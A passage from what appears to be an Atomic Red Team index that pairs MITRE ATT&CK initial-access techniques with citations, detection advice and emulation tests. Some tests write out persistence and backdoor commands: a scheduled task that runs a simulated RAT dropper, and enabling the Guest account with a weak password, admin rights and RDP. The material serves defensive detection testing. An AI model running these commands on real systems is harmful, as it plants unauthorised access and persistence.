          may contain malicious code. Retrieved May 28, 2019.
        url: https://www-01.ibm.com/support/docview.wss?uid=ssg1S1010146&myns=s028&mynp=OCSTHGUJ&mynp=OCSTLM5A&mynp=OCSTLM6B&mynp=OCHW206&mync=E&cm_sp=s028-_-OCSTHGUJ-OCSTLM5A-OCSTLM6B-OCHW206-_-E
      - source_name: Symantec Elderwood Sept 2012
        description: O'Gorman, G., and McDonald, G.. (2012, September 6). The Elderwood
          Project. Retrieved February 15, 2018.
        url: https://web.archive.org/web/20190717233006/http://www.symantec.com/content/en/us/enterprise/media/security_response/whitepapers/the-elderwood-project.pdf
      - source_name: Schneider Electric USB Malware
        description: Schneider Electric. (2018, August 24). Security Notification
          â€“ USB Removable Media Provided With Conext Combox and Conext Battery Monitor.
          Retrieved May 28, 2019.
        url: https://www.se.com/ww/en/download/document/SESN-2018-236-01/
      - source_name: Trendmicro NPM Compromise
        description: Trendmicro. (2018, November 29). Hacker Infects Node.js Package
          to Steal from Bitcoin Wallets. Retrieved April 10, 2019.
        url: https://www.trendmicro.com/vinfo/dk/security/news/cybercrime-and-digital-threats/hacker-infects-node-js-package-to-steal-from-bitcoin-wallets
      - source_name: Microsoft Dofoil 2018
        description: Windows Defender Research. (2018, March 7). Behavior monitoring
          combined with machine learning spoils a massive Dofoil coin mining campaign.
          Retrieved March 20, 2018.
        url: https://cloudblogs.microsoft.com/microsoftsecure/2018/03/07/behavior-monitoring-combined-with-machine-learning-spoils-a-massive-dofoil-coin-mining-campaign/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      identifier: T1195
    atomic_tests:
    - name: Octopus Scanner Malware Open Source Supply Chain
      auto_generated_guid: 82a9f001-94c5-495e-9ed5-f530dbded5e2
      description: |
        This test simulates an adversary Octopus drop the RAT dropper ExplorerSync.db
        [octopus-scanner-malware-open-source-supply-chain](https://securitylab.github.com/research/octopus-scanner-malware-open-source-supply-chain/)
        [the-supreme-backdoor-factory](https://www.dfir.it/blog/2019/02/26/the-supreme-backdoor-factory/)
      supported_platforms:
      - windows
      input_arguments:
        rat_payload:
          description: RAT dropper ExplorerSync.db
          type: path
          default: "$env:TEMP\\ExplorerSync.db"
      dependency_executor_name: powershell
      dependencies:
      - description: 'ExplorerSync.db must exist on disk at specified location (#{rat_payload})

          '
        prereq_command: 'if (Test-Path #{rat_payload}) {exit 0} else {exit 1}

          '
        get_prereq_command: 'Out-File -FilePath "#{rat_payload}"

          '
      executor:
        command: |
          copy %temp%\ExplorerSync.db %temp%\..\Microsoft\ExplorerSync.db
          schtasks /create /tn ExplorerSync /tr "javaw -jar %temp%\..\Microsoft\ExplorerSync.db" /sc MINUTE /f
        cleanup_command: |
          schtasks /delete /tn ExplorerSync /F 2>null
          del %temp%\..\Microsoft\ExplorerSync.db 2>null
          del %temp%\ExplorerSync.db 2>null
        name: command_prompt
  T1190:
    technique:
      modified: '2023-04-14T22:18:39.190Z'
      name: Exploit Public-Facing Application
      description: "Adversaries may attempt to exploit a weakness in an Internet-facing
        host or system to initially access a network. The weakness in the system can
        be a software bug, a temporary glitch, or a misconfiguration.\n\nExploited
        applications are often websites/web servers, but can also include databases
        (like SQL), standard services (like SMB or SSH), network device administration
        and management protocols (like SNMP and Smart Install), and any other system
        with Internet accessible open sockets.(Citation: NVD CVE-2016-6662)(Citation:
        CIS Multiple SMB Vulnerabilities)(Citation: US-CERT TA18-106A Network Infrastructure
        Devices 2018)(Citation: Cisco Blog Legacy Device Attacks)(Citation: NVD CVE-2014-7169)
        Depending on the flaw being exploited this may also involve [Exploitation
        for Defense Evasion](https://attack.mitre.org/techniques/T1211). \n\nIf an
        application is hosted on cloud-based infrastructure and/or is containerized,
        then exploiting it may lead to compromise of the underlying instance or container.
        This can allow an adversary a path to access the cloud or container APIs,
        exploit container host access via [Escape to Host](https://attack.mitre.org/techniques/T1611),
        or take advantage of weak identity and access management policies.\n\nAdversaries
        may also exploit edge network infrastructure and related appliances, specifically
        targeting devices that do not support robust host-based defenses.(Citation:
        Mandiant Fortinet Zero Day)(Citation: Wired Russia Cyberwar)\n\nFor websites
        and databases, the OWASP top 10 and CWE top 25 highlight the most common web-based
        vulnerabilities.(Citation: OWASP Top 10)(Citation: CWE top 25)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_contributors:
      - Yossi Weizman, Azure Defender Research Team
      - Praetorian
      x_mitre_deprecated: false
      x_mitre_detection: Monitor application logs for abnormal behavior that may indicate
        attempted or successful exploitation. Use deep packet inspection to look for
        artifacts of common exploit traffic, such as SQL injection. Web Application
        Firewalls may detect improper inputs attempting exploitation.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Windows
      - IaaS
      - Network
      - Linux
      - macOS
      - Containers
      x_mitre_version: '2.4'
      x_mitre_data_sources:
      - 'Network Traffic: Network Traffic Content'
      - 'Application Log: Application Log Content'
      type: attack-pattern
      id: attack-pattern--3f886f2a-874f-4333-b794-aa6075009b1c
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1190
        external_id: T1190
      - source_name: CWE top 25
        description: Christey, S., Brown, M., Kirby, D., Martin, B., Paller, A.. (2011,
          September 13). 2011 CWE/SANS Top 25 Most Dangerous Software Errors. Retrieved
          April 10, 2019.
        url: https://cwe.mitre.org/top25/index.html
      - source_name: CIS Multiple SMB Vulnerabilities
        description: CIS. (2017, May 15). Multiple Vulnerabilities in Microsoft Windows
          SMB Server Could Allow for Remote Code Execution. Retrieved April 3, 2018.
        url: https://www.cisecurity.org/advisory/multiple-vulnerabilities-in-microsoft-windows-smb-server-could-allow-for-remote-code-execution/
      - source_name: Wired Russia Cyberwar
        description: Greenberg, A. (2022, November 10). Russiaâ€™s New Cyberwarfare
          in Ukraine Is Fast, Dirty, and Relentless. Retrieved March 22, 2023.
        url: https://www.wired.com/story/russia-ukraine-cyberattacks-mandiant/
      - source_name: Mandiant Fortinet Zero Day
        description: Marvi, A. et al.. (2023, March 16). Fortinet Zero-Day and Custom
          Malware Used by Suspected Chinese Actor in Espionage Operation. Retrieved
          March 22, 2023.
        url: https://www.mandiant.com/resources/blog/fortinet-malware-ecosystem
      - source_name: NVD CVE-2016-6662
        description: National Vulnerability Database. (2017, February 2). CVE-2016-6662
          Detail. Retrieved April 3, 2018.
        url: https://nvd.nist.gov/vuln/detail/CVE-2016-6662
      - source_name: NVD CVE-2014-7169
        description: National Vulnerability Database. (2017, September 24). CVE-2014-7169
          Detail. Retrieved April 3, 2018.
        url: https://nvd.nist.gov/vuln/detail/CVE-2014-7169
      - source_name: Cisco Blog Legacy Device Attacks
        description: Omar Santos. (2020, October 19). Attackers Continue to Target
          Legacy Devices. Retrieved October 20, 2020.
        url: https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954
      - source_name: OWASP Top 10
        description: OWASP. (2018, February 23). OWASP Top Ten Project. Retrieved
          April 3, 2018.
        url: https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project
      - source_name: US-CERT TA18-106A Network Infrastructure Devices 2018
        description: US-CERT. (2018, April 20). Russian State-Sponsored Cyber Actors
          Targeting Network Infrastructure Devices. Retrieved October 19, 2020.
        url: https://us-cert.cisa.gov/ncas/alerts/TA18-106A
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1078.001:
    technique:
      modified: '2023-03-30T21:01:44.382Z'
      name: 'Valid Accounts: Default Accounts'
      description: |-
        Adversaries may obtain and abuse credentials of a default account as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Default accounts are those that are built-into an OS, such as the Guest or Administrator accounts on Windows systems. Default accounts also include default factory/provider set accounts on other types of systems, software, or devices, including the root user account in AWS and the default service account in Kubernetes.(Citation: Microsoft Local Accounts Feb 2019)(Citation: AWS Root User)(Citation: Threat Matrix for Kubernetes)

        Default accounts are not limited to client machines, rather also include accounts that are preset for equipment such as network devices and computer applications whether they are internal, open source, or commercial. Appliances that come preset with a username and password combination pose a serious threat to organizations that do not change it post installation, as they are easy targets for an adversary. Similarly, adversaries may also utilize publicly disclosed or stolen [Private Keys](https://attack.mitre.org/techniques/T1552/004) or credential materials to legitimately connect to remote environments via [Remote Services](https://attack.mitre.org/techniques/T1021).(Citation: Metasploit SSH Module)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: Monitor whether default accounts have been activated or logged
        into. These audits should also include checks on any appliances and applications
        for default credentials or SSH keys, and if any are discovered, they should
        be updated immediately.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: true
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      x_mitre_version: '1.2'
      x_mitre_data_sources:
      - 'User Account: User Account Authentication'
      - 'Logon Session: Logon Session Creation'
      x_mitre_permissions_required:
      - Administrator
      - User
      type: attack-pattern
      id: attack-pattern--6151cbea-819b-455a-9fa6-99a1cc58797d
      created: '2020-03-13T20:15:31.974Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1078/001
        external_id: T1078.001
      - source_name: Microsoft Local Accounts Feb 2019
        description: Microsoft. (2018, December 9). Local Accounts. Retrieved February
          11, 2019.
        url: https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/local-accounts
      - source_name: AWS Root User
        description: Amazon. (n.d.). AWS Account Root User. Retrieved April 5, 2021.
        url: https://docs.aws.amazon.com/IAM/latest/UserGuide/id_root-user.html
      - source_name: Threat Matrix for Kubernetes
        description: Weizman, Y. (2020, April 2). Threat Matrix for Kubernetes. Retrieved
          March 30, 2021.
        url: https://www.microsoft.com/security/blog/2020/04/02/attack-matrix-kubernetes/
      - source_name: Metasploit SSH Module
        description: undefined. (n.d.). Retrieved April 12, 2019.
        url: https://github.com/rapid7/metasploit-framework/tree/master/modules/exploits/linux/ssh
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      identifier: T1078.001
    atomic_tests:
    - name: Enable Guest account with RDP capability and admin privileges
      auto_generated_guid: 99747561-ed8d-47f2-9c91-1e5fde1ed6e0
      description: |
        After execution the Default Guest account will be enabled (Active) and added to Administrators and Remote Desktop Users Group,
        and desktop will allow multiple RDP connections.
      supported_platforms:
      - windows
      input_arguments:
        guest_user:
          description: Specify the guest account
          type: string
          default: guest
        guest_password:
          description: Specify the guest password
          type: string
          default: Password123!
        local_admin_group:
          description: Specify the admin localgroup name
          type: string
          default: Administrators
        remote_desktop_users_group_name:
          description: Specify the remote desktop users group name
          type: string
          default: Remote Desktop Users
        remove_rdp_access_during_cleanup:
          description: Set to 1 if you want the cleanup to remove RDP access to machine
          type: integer
          default: 0
      executor:
        command: |-
          net user #{guest_user} /active:yes
          net user #{guest_user} #{guest_password}
          net localgroup #{local_admin_group} #{guest_user} /add
          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /add
          reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f
          reg add "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /t REG_DWORD /d 0x1 /f
        cleanup_command: |-
          net user #{guest_user} /active:no >nul 2>&1
          net localgroup #{local_admin_group} #{guest_user} /delete >nul 2>&1
          net localgroup "#{remote_desktop_users_group_name}" #{guest_user} /delete >nul 2>&1
          if #{remove_rdp_access_during_cleanup} NEQ 1 (echo Note: set remove_rdp_access_during_cleanup input argument to disable RDP access during cleanup)
          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /f >nul 2>&1)
          if #{remove_rdp_access_during_cleanup} EQU 1 (reg delete "hklm\system\CurrentControlSet\Control\Terminal Server" /v "AllowTSConnections" /f >nul 2>&1)
        name: command_prompt
        elevation_required: true
    - name: Activate Guest Account
      auto_generated_guid: aa6cb8c4-b582-4f8e-b677-37733914abda
      description: 'The Adversaries can activate the default Guest user. The guest
        account is inactivated by default

        '
      supported_platforms:
      - windows
      input_arguments:
        guest_user:
          description: Specify the guest account
          type: string
          default: guest
      executor:
        command: 'net user #{guest_user} /active:yes

          '
        cleanup_command: 'net user #{guest_user} /active:no

          '
        name: command_prompt
        elevation_required: true
    - name: Enable Guest Account on macOS
      auto_generated_guid: 0315bdff-4178-47e9-81e4-f31a6d23f7e4
      description: This test enables the guest account on macOS using sysadminctl
        utility.
      supported_platforms:
      - macos
      executor:
        command: sudo sysadminctl -guestAccount on
        cleanup_command: sudo sysadminctl -guestAccount off
        name: command_prompt
        elevation_required: true
  T1193:
    technique:
      x_mitre_platforms:
      - Windows
      - macOS
      - Linux
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      id: attack-pattern--6aac77c4-eaf2-4366-8c13-ce50ab951f38
      type: attack-pattern
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: true
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1193
        external_id: T1193
      - external_id: CAPEC-163
        source_name: capec
        url: https://capec.mitre.org/data/definitions/163.html
      modified: '2020-03-02T19:08:17.884Z'
      name: Spearphishing Attachment
      description: |-
        Spearphishing attachment is a specific variant of spearphishing. Spearphishing attachment is different from other forms of spearphishing in that it employs the use of malware attached to an email. All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this scenario, adversaries attach a file to the spearphishing email and usually rely upon [User Execution](https://attack.mitre.org/techniques/T1204) to gain execution.

        There are many options for the attachment such as Microsoft Office documents, executables, PDFs, or archived files. Upon opening the attachment (and potentially clicking past protections), the adversary's payload exploits a vulnerability or directly executes on the user's system. The text of the spearphishing email usually tries to give a plausible reason why the file should be opened, and may explain how to bypass system protections in order to do so. The email may also contain instructions on how to decrypt an attachment, such as a zip file password, in order to evade email boundary defenses. Adversaries frequently manipulate file extensions and icons in order to make attached executables appear to be document files, or files exploiting one application appear to be a file for a different one.
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: |-
        Network intrusion detection systems and email gateways can be used to detect spearphishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

        Anti-virus can potentially detect malicious documents and attachments as they're scanned to be stored on the email server or on the user's computer. Endpoint sensing or network sensing can potentially detect malicious events once the attachment is opened (such as a Microsoft Word document or PDF reaching out to the internet or spawning Powershell.exe) for techniques such as [Exploitation for Client Execution](https://attack.mitre.org/techniques/T1203) and [Scripting](https://attack.mitre.org/techniques/T1064).
      x_mitre_version: '1.0'
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_is_subtechnique: false
    atomic_tests: []
  T1199:
    technique:
      modified: '2022-10-21T14:35:00.274Z'
      name: Trusted Relationship
      description: |-
        Adversaries may breach or otherwise leverage organizations who have access to intended victims. Access through trusted third party relationship abuses an existing connection that may not be protected or receives less scrutiny than standard mechanisms of gaining access to a network.

        Organizations often grant elevated access to second or third-party external providers in order to allow them to manage internal systems as well as cloud-based environments. Some examples of these relationships include IT services contractors, managed security providers, infrastructure contractors (e.g. HVAC, elevators, physical security). The third-party provider's access may be intended to be limited to the infrastructure being maintained, but may exist on the same network as the rest of the enterprise. As such, [Valid Accounts](https://attack.mitre.org/techniques/T1078) used by the other party for access to internal network systems may be compromised and used.(Citation: CISA IT Service Providers)

        In Office 365 environments, organizations may grant Microsoft partners or resellers delegated administrator permissions. By compromising a partner or reseller account, an adversary may be able to leverage existing delegated administrator relationships or send new delegated administrator offers to clients in order to gain administrative control over the victim tenant.(Citation: Office 365 Delegated Administration)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_detection: Establish monitoring for activity conducted by second and
        third party providers and other trusted entities that may be leveraged as
        a means to gain access to the network. Depending on the type of relationship,
        an adversary may have access to significant amounts of information about the
        target before conducting an operation, especially if the trusted relationship
        is based on IT services. Adversaries may be able to act quickly towards an
        objective, so proper monitoring for behavior related to Credential Access,
        Lateral Movement, and Collection will be important to detect the intrusion.
      x_mitre_platforms:
      - Windows
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Office 365
      x_mitre_is_subtechnique: false
      x_mitre_deprecated: false
      x_mitre_domains:
      - enterprise-attack
      x_mitre_version: '2.3'
      x_mitre_contributors:
      - Praetorian
      - ExtraHop
      - Jannie Li, Microsoft Threat Intelligenceâ€¯Centerâ€¯(MSTIC)
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'Application Log: Application Log Content'
      - 'Network Traffic: Network Traffic Content'
      - 'Logon Session: Logon Session Metadata'
      type: attack-pattern
      id: attack-pattern--9fa07bef-9c81-421e-a8e5-ad4366c5a925
      created: '2018-04-18T17:59:24.739Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1199
        external_id: T1199
      - source_name: CISA IT Service Providers
        description: CISA. (n.d.). APTs Targeting IT Service Provider Customers. Retrieved
          November 16, 2020.
        url: https://us-cert.cisa.gov/APTs-Targeting-IT-Service-Provider-Customers
      - source_name: Office 365 Delegated Administration
        description: 'Microsoft. (n.d.). Partners: Offer delegated administration.
          Retrieved May 27, 2022.'
        url: https://support.microsoft.com/en-us/topic/partners-offer-delegated-administration-26530dc0-ebba-415b-86b1-b55bc06b073e?ui=en-us&rs=en-us&ad=us
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 2.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1566:
    technique:
      modified: '2023-04-14T17:42:15.871Z'
      name: Phishing
      description: "Adversaries may send phishing messages to gain access to victim
        systems. All forms of phishing are electronically delivered social engineering.
        Phishing can be targeted, known as spearphishing. In spearphishing, a specific
        individual, company, or industry will be targeted by the adversary. More generally,
        adversaries can conduct non-targeted phishing, such as in mass malware spam
        campaigns.\n\nAdversaries may send victims emails containing malicious attachments
        or links, typically to execute malicious code on victim systems. Phishing
        may also be conducted via third-party services, like social media platforms.
        Phishing may also involve social engineering techniques, such as posing as
        a trusted source, as well as evasive techniques such as removing or manipulating
        emails or metadata/headers from compromised accounts being abused to send
        messages (e.g., [Email Hiding Rules](https://attack.mitre.org/techniques/T1564/008)).(Citation:
        Microsoft OAuth Spam 2022)(Citation: Palo Alto Unit 42 VBA Infostealer 2014)
        Another way to accomplish this is by forging or spoofing(Citation: Proofpoint-spoof)
        the identity of the sender which can be used to fool both the human recipient
        as well as automated security tools.(Citation: cyberproof-double-bounce) \n\nVictims
        may also receive phishing messages that instruct them to call a phone number
        where they are directed to visit a malicious URL, download malware,(Citation:
        sygnia Luna Month)(Citation: CISA Remote Monitoring and Management Software)
        or install adversary-accessible remote management tools onto their computer
        (i.e., [User Execution](https://attack.mitre.org/techniques/T1204)).(Citation:
        Unit42 Luna Moth)"
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_contributors:
      - Philip Winther
      - Ohad Zaidenberg, @ohad_mz
      - Liora Itkin
      - Liran Ravich, CardinalOps
      - Scott Cook, Capital One
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Network intrusion detection systems and email gateways can be used to detect phishing with malicious attachments in transit. Detonation chambers may also be used to identify malicious attachments. Solutions can be signature and behavior based, but adversaries may construct attachments in a way to avoid these systems.

        Filtering based on DKIM+SPF or header analysis can help detect when the email sender is spoofed.(Citation: Microsoft Anti Spoofing)(Citation: ACSC Email Spoofing)

        URL inspection within email (including expanding shortened links) can help detect links leading to known malicious sites. Detonation chambers can be used to detect these links and either automatically go to these sites to determine if they're potentially malicious, or wait and capture the content if a user visits the link.

        Because most common third-party services used for phishing via service leverage TLS encryption, SSL/TLS inspection is generally required to detect the initial communication/delivery. With SSL/TLS inspection intrusion detection signatures or other security gateway appliances may be able to detect malware.

        Anti-virus can potentially detect malicious documents and files that are downloaded on the user's computer. Many possible detections of follow-on behavior may take place once [User Execution](https://attack.mitre.org/techniques/T1204) occurs.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      - SaaS
      - Office 365
      - Google Workspace
      x_mitre_version: '2.3'
      x_mitre_data_sources:
      - 'Application Log: Application Log Content'
      - 'File: File Creation'
      - 'Network Traffic: Network Traffic Content'
      - 'Network Traffic: Network Traffic Flow'
      type: attack-pattern
      id: attack-pattern--a62a8db3-f23a-4d8f-afd6-9dbc77e7813b
      created: '2020-03-02T18:45:07.892Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1566
        external_id: T1566
      - source_name: ACSC Email Spoofing
        description: Australian Cyber Security Centre. (2012, December). Mitigating
          Spoofed Emails Using Sender Policy Framework. Retrieved October 19, 2020.
        url: https://www.cyber.gov.au/sites/default/files/2019-03/spoof_email_sender_policy_framework.pdf
      - source_name: CISA Remote Monitoring and Management Software
        description: CISA. (n.d.). Protecting Against Malicious Use of Remote Monitoring
          and Management Software. Retrieved February 2, 2023.
        url: https://www.cisa.gov/uscert/ncas/alerts/aa23-025a
      - source_name: cyberproof-double-bounce
        description: Itkin, Liora. (2022, September 1). Double-bounced attacks with
          email spoofing . Retrieved February 24, 2023.
        url: https://blog.cyberproof.com/blog/double-bounced-attacks-with-email-spoofing-2022-trends
      - source_name: Unit42 Luna Moth
        description: Kristopher Russo. (n.d.). Luna Moth Callback Phishing Campaign.
          Retrieved February 2, 2023.
        url: https://unit42.paloaltonetworks.com/luna-moth-callback-phishing/
      - source_name: Microsoft Anti Spoofing
        description: Microsoft. (2020, October 13). Anti-spoofing protection in EOP.
          Retrieved October 19, 2020.
        url: https://docs.microsoft.com/en-us/microsoft-365/security/office-365-security/anti-spoofing-protection?view=o365-worldwide
      - source_name: Microsoft OAuth Spam 2022
        description: Microsoft. (2023, September 22). Malicious OAuth applications
          abuse cloud email services to spread spam. Retrieved March 13, 2023.
        url: https://www.microsoft.com/en-us/security/blog/2022/09/22/malicious-oauth-applications-used-to-compromise-email-servers-and-spread-spam/
      - source_name: sygnia Luna Month
        description: 'Oren Biderman, Tomer Lahiyani, Noam Lifshitz, Ori Porag. (n.d.).
          LUNA MOTH: THE THREAT ACTORS BEHIND RECENT FALSE SUBSCRIPTION SCAMS. Retrieved
          February 2, 2023.'
        url: https://blog.sygnia.co/luna-moth-false-subscription-scams
      - source_name: Proofpoint-spoof
        description: Proofpoint. (n.d.). What Is Email Spoofing?. Retrieved February
          24, 2023.
        url: https://www.proofpoint.com/us/threat-reference/email-spoofing
      - source_name: Palo Alto Unit 42 VBA Infostealer 2014
        description: Vicky Ray and Rob Downs. (2014, October 29). Examining a VBA-Initiated
          Infostealer Campaign. Retrieved March 13, 2023.
        url: https://unit42.paloaltonetworks.com/examining-vba-initiated-infostealer-campaign/
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
    atomic_tests: []
  T1078:
    technique:
      modified: '2023-03-30T21:01:51.631Z'
      name: Valid Accounts
      description: |-
        Adversaries may obtain and abuse credentials of existing accounts as a means of gaining Initial Access, Persistence, Privilege Escalation, or Defense Evasion. Compromised credentials may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access, network devices, and remote desktop.(Citation: volexity_0day_sophos_FW) Compromised credentials may also grant an adversary increased privilege to specific systems or access to restricted areas of the network. Adversaries may choose not to use malware or tools in conjunction with the legitimate access those credentials provide to make it harder to detect their presence.

        In some cases, adversaries may abuse inactive accounts: for example, those belonging to individuals who are no longer part of an organization. Using these accounts may allow the adversary to evade detection, as the original account user will not be present to identify any anomalous activity taking place on their account.(Citation: CISA MFA PrintNightmare)

        The overlap of permissions for local, domain, and cloud accounts across a network of systems is of concern because the adversary may be able to pivot across accounts and systems to reach a high level of access (i.e., domain or enterprise administrator) to bypass access controls set within the enterprise.(Citation: TechNet Credential Theft)
      kill_chain_phases:
      - kill_chain_name: mitre-attack
        phase_name: defense-evasion
      - kill_chain_name: mitre-attack
        phase_name: persistence
      - kill_chain_name: mitre-attack
        phase_name: privilege-escalation
      - kill_chain_name: mitre-attack
        phase_name: initial-access
      x_mitre_attack_spec_version: 3.1.0
      x_mitre_contributors:
      - Syed Ummar Farooqh, McAfee
      - Prasad Somasamudram, McAfee
      - Sekhar Sarukkai, McAfee
      - Jon Sternstein, Stern Security
      - Yossi Weizman, Azure Defender Research Team
      - Netskope
      - Mark Wee
      - Praetorian
      - Goldstein Menachem
      x_mitre_deprecated: false
      x_mitre_detection: |-
        Configure robust, consistent account activity audit policies across the enterprise and with externally accessible services.(Citation: TechNet Audit Policy) Look for suspicious account behavior across systems that share accounts, either user, admin, or service accounts. Examples: one account logged into multiple systems simultaneously; multiple accounts logged into the same machine simultaneously; accounts logged in at odd times or outside of business hours. Activity may be from interactive login sessions or process ownership from accounts being used to execute binaries on a remote system as a particular account. Correlate other security systems with login information (e.g., a user has an active login session but has not entered the building or does not have VPN access).

        Perform regular audits of domain and local system accounts to detect accounts that may have been created by an adversary for persistence. Checks on these accounts could also include whether default accounts such as Guest have been activated. These audits should also include checks on any appliances and applications for default credentials or SSH keys, and if any are discovered, they should be updated immediately.
      x_mitre_domains:
      - enterprise-attack
      x_mitre_is_subtechnique: false
      x_mitre_modified_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      x_mitre_platforms:
      - Windows
      - Azure AD
      - Office 365
      - SaaS
      - IaaS
      - Linux
      - macOS
      - Google Workspace
      - Containers
      - Network
      x_mitre_version: '2.6'
      x_mitre_data_sources:
      - 'Logon Session: Logon Session Creation'
      - 'User Account: User Account Authentication'
      - 'Logon Session: Logon Session Metadata'
      x_mitre_defense_bypassed:
      - Firewall
      - Anti-virus
      - Host Intrusion Prevention Systems
      - Network Intrusion Detection System
      - Application Control
      - System Access Controls
      x_mitre_effective_permissions:
      - User
      - Administrator
      x_mitre_permissions_required:
      - User
      - Administrator
      type: attack-pattern
      id: attack-pattern--b17a1a56-e99c-403c-8948-561df0cffe81
      created: '2017-05-31T21:31:00.645Z'
      created_by_ref: identity--c78cb6e5-0c4b-4611-8297-d1b8b55e40b5
      revoked: false
      external_references:
      - source_name: mitre-attack
        url: https://attack.mitre.org/techniques/T1078
        external_id: T1078
      - source_name: volexity_0day_sophos_FW
        description: 'Adair, S., Lancaster, T., Volexity Threat Research. (2022, June
          15). DriftingCloud: Zero-Day Sophos Firewall Exploitation and an Insidious
          Breach. Retrieved July 1, 2022.'
        url: https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/
      - source_name: CISA MFA PrintNightmare
        description: Cybersecurity and Infrastructure Security Agency. (2022, March
          15). Russian State-Sponsored Cyber Actors Gain Network Access by Exploiting
          Default Multifactor Authentication Protocols and â€œPrintNightmareâ€? Vulnerability.
          Retrieved March 16, 2022.
        url: https://www.cisa.gov/uscert/ncas/alerts/aa22-074a
      - source_name: TechNet Credential Theft
        description: Microsoft. (2016, April 15). Attractive Accounts for Credential
          Theft. Retrieved June 3, 2016.
        url: https://technet.microsoft.com/en-us/library/dn535501.aspx
      - source_name: TechNet Audit Policy
        description: Microsoft. (2016, April 15). Audit Policy Recommendations. Retrieved
          June 3, 2016.
        url: https://technet.microsoft.com/en-us/library/dn487457.aspx
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
    atomic_tests: []
  T1195.002:
    technique:
      x_mitre_platforms:
      - Linux
      - macOS
      - Windows
      x_mitre_domains:
      - enterprise-attack
      object_marking_refs:
      - marking-definition--fa42a846-8d90-4e51-bc29-71d5b4802168
      type: attack-pattern
      id: attack-pattern--bd369cd9-abb8-41ce-b5bb-fff23ee86c00
      created: '2020-03-11T14:17:21.153Z'
      x_mitre_version: '1.1'
      external_references:
      - source_name: mitre-attack
        external_id: T1195.002
        url: https://attack.mitre.org/techniques/T1195/002
      - source_name: Avast CCleaner3 2018
        url: https://blog.avast.com/new-investigations-in-ccleaner-incident-point-to-a-possible-third-stage-that-had-keylogger-capacities
        description: Avast Threat Intelligence Team. (2018, March 8). New investigations
          into the CCleaner incident point to a possible third stage that had keylogger
          capacities. Retrieved March 15, 2018.
      - source_name: Command Five SK 2011
